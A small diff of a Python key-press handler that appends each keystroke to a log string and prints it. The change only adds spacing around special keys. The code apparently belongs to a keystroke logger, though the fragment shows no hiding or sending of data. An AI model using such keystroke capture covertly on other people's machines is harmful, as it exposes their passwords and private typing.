@@ -11,7 +11,7 @@ def process_key_press(key):
         log = log + str(key.char)
         print(log)
     except AttributeError:
-        log = log + str(key)
+        log = log + " " + str(key) + " "
         print(log)
 
 
